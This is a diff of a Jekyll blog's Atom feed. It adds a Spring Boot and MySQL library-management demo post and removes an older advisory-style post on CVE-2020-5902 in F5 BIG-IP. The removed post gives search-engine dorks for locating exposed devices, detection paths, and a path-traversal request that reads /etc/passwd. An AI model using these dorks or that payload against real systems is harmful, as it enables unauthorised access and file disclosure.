@@ -1,11 +1,132 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-22T09:10:28-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-23T09:33:02-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
 &lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
   &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
 &lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
   &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
-</subtitle><entry><title type="html">MySql存储引擎</title><link href="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/" rel="alternate" type="text/html" title="MySql存储引擎" /><published>2020-07-22T00:00:00-04:00</published><updated>2020-07-22T00:00:00-04:00</updated><id>http://localhost:4000/_posts/MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/">&lt;p&gt;[toc]&lt;/p&gt;
+</subtitle><entry><title type="html">图书管理系统demo</title><link href="http://localhost:4000/_posts/2020-07-23-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdemo/" rel="alternate" type="text/html" title="图书管理系统demo" /><published>2020-07-23T00:00:00-04:00</published><updated>2020-07-23T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdemo</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-23-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdemo/">&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;h1 id=&quot;创建数据库&quot;&gt;创建数据库&lt;/h1&gt;
+
+&lt;p&gt;连接&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql -u root -p
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;创建BookManager&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;create database BookManager;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;创建book表&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;use BookManager;
+DROP TABLE IF EXISTS `book`;
+
+CREATE TABLE `book` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(256) DEFAULT NULL,
+  `author` varchar(256) DEFAULT NULL,
+  `price` varchar(256) DEFAULT NULL,
+  `status` int(11) DEFAULT '0',
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `name` (`name`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+LOCK TABLES `book` WRITE;
+
+INSERT INTO `book` (`id`, `name`, `author`, `price`, `status`)
+VALUES
+	(1,'枪毙任老道','大英雄王思文','100￥',0),
+	(2,'论一个演员的自我修养','斯坦尼斯拉夫斯基','20.40￥',0);
+UNLOCK TABLES;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;创建ticket表&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `ticket`;
+
+CREATE TABLE `ticket` (
+  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(11) DEFAULT NULL,
+  `ticket` varchar(1024) DEFAULT NULL,
+  `expired_at` datetime DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `uid` (`user_id`),
+  UNIQUE KEY `t` (`ticket`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;创建user表&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `user`;
+CREATE TABLE `user` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(256) DEFAULT NULL,
+  `email` varchar(256) DEFAULT '',
+  `password` varchar(256) DEFAULT '',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;配置pom文件&quot;&gt;配置pom文件&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
+    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
+    &amp;lt;parent&amp;gt;
+        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
+        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
+        &amp;lt;version&amp;gt;2.3.1.RELEASE&amp;lt;/version&amp;gt;
+        &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
+    &amp;lt;/parent&amp;gt;
+    &amp;lt;groupId&amp;gt;com.lazycat&amp;lt;/groupId&amp;gt;
+    &amp;lt;artifactId&amp;gt;lazycat&amp;lt;/artifactId&amp;gt;
+    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
+    &amp;lt;name&amp;gt;lazycat&amp;lt;/name&amp;gt;
+    &amp;lt;description&amp;gt;Demo project for Spring Boot&amp;lt;/description&amp;gt;
+
+    &amp;lt;properties&amp;gt;
+        &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;
+    &amp;lt;/properties&amp;gt;
+
+    &amp;lt;dependencies&amp;gt;
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
+            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
+            &amp;lt;exclusions&amp;gt;
+                &amp;lt;exclusion&amp;gt;
+                    &amp;lt;groupId&amp;gt;org.junit.vintage&amp;lt;/groupId&amp;gt;
+                    &amp;lt;artifactId&amp;gt;junit-vintage-engine&amp;lt;/artifactId&amp;gt;
+                &amp;lt;/exclusion&amp;gt;
+            &amp;lt;/exclusions&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+    &amp;lt;/dependencies&amp;gt;
+
+    &amp;lt;build&amp;gt;
+        &amp;lt;plugins&amp;gt;
+            &amp;lt;plugin&amp;gt;
+                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
+                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
+            &amp;lt;/plugin&amp;gt;
+        &amp;lt;/plugins&amp;gt;
+    &amp;lt;/build&amp;gt;
+
+&amp;lt;/project&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;curd&quot;&gt;CURD&lt;/h1&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">MySql存储引擎</title><link href="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/" rel="alternate" type="text/html" title="MySql存储引擎" /><published>2020-07-22T00:00:00-04:00</published><updated>2020-07-22T00:00:00-04:00</updated><id>http://localhost:4000/_posts/MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;h1 id=&quot;什么是存储引擎&quot;&gt;什么是存储引擎&lt;/h1&gt;
 
@@ -4772,79 +4893,4 @@ int main(int argc,char ** argv[])
 
 &lt;p&gt;在启动U盘时，当看到&lt;code&gt;Try Ubuntu ，Install Ubuntu&lt;/code&gt;时，按下&lt;code&gt;e&lt;/code&gt;键，把出现的文字中&lt;code&gt;quiet splash&lt;/code&gt;改为&lt;code&gt;nomodeset&lt;/code&gt;，然后按&lt;code&gt;F10&lt;/code&gt;重启&lt;/p&gt;
 
-&lt;p&gt;后续即可进入桌面进行安装了&lt;/p&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry><entry><title type="html">cve-2020-5902</title><link href="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/" rel="alternate" type="text/html" title="cve-2020-5902" /><published>2020-07-06T00:00:00-04:00</published><updated>2020-07-06T00:00:00-04:00</updated><id>http://localhost:4000/_posts/cve-2020-5902</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/">&lt;p&gt;[toc]&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;&lt;code&gt;警告,用于学习,切勿做破坏,造成的后果本人概不负责&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;2020年07月03日， 360CERT监测发现 &lt;code&gt;F5&lt;/code&gt; 发布了 &lt;code&gt;F5 BIG-IP 远程代码执行&lt;/code&gt; 的风险通告，该漏洞编号为 &lt;code&gt;CVE-2020-5902&lt;/code&gt;，漏洞等级：&lt;code&gt;严重&lt;/code&gt;。&lt;/p&gt;
-
-  &lt;p&gt;未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;漏洞详情&quot;&gt;漏洞详情&lt;/h1&gt;
-
-&lt;p&gt;&lt;code&gt;F5 BIG-IP&lt;/code&gt; 是美国&lt;code&gt;F5&lt;/code&gt;公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。&lt;/p&gt;
-
-&lt;p&gt;在 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。&lt;/p&gt;
-
-&lt;h1 id=&quot;影响版本&quot;&gt;影响版本&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;BIG-IP 15.x: 15.1.0/15.0.0&lt;/li&gt;
-  &lt;li&gt;BIG-IP 14.x: 14.1.0 ~ 14.1.2&lt;/li&gt;
-  &lt;li&gt;BIG-IP 13.x: 13.1.0 ~ 13.1.3&lt;/li&gt;
-  &lt;li&gt;BIG-IP 12.x: 12.1.0 ~ 12.1.5&lt;/li&gt;
-  &lt;li&gt;BIG-IP 11.x: 11.6.1 ~ 11.6.5&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;修复建议&quot;&gt;修复建议&lt;/h1&gt;
-
-&lt;p&gt;升级到以下版本&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;BIG-IP 15.x: 15.1.0.4&lt;/li&gt;
-  &lt;li&gt;BIG-IP 14.x: 14.1.2.6&lt;/li&gt;
-  &lt;li&gt;BIG-IP 13.x: 13.1.3.4&lt;/li&gt;
-  &lt;li&gt;BIG-IP 12.x: 12.1.5.2&lt;/li&gt;
-  &lt;li&gt;BIG-IP 11.x: 11.6.5.2&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;目标搜索&quot;&gt;目标搜索&lt;/h1&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;注：请将下面的%26替换为&amp;amp;&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;
- http.favicon.hash:-335242539&lt;/p&gt;
-
-  &lt;p&gt;http.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;
- title=”BIG-IP%26reg;- Redirect”&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;
- 443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;
-
-  &lt;p&gt;443.https.get.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;
- inurl:”tmui/login.jsp”&lt;/p&gt;
-
-  &lt;p&gt;intitle:”BIG-IP” inurl:”tmui”&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;漏洞检测&quot;&gt;漏洞检测&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
-/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;利用&quot;&gt;利用&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;测试结果&quot;&gt;测试结果&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/5902.png&quot; alt=&quot;5902&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
+&lt;p&gt;后续即可进入桌面进行安装了&lt;/p&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry></feed>
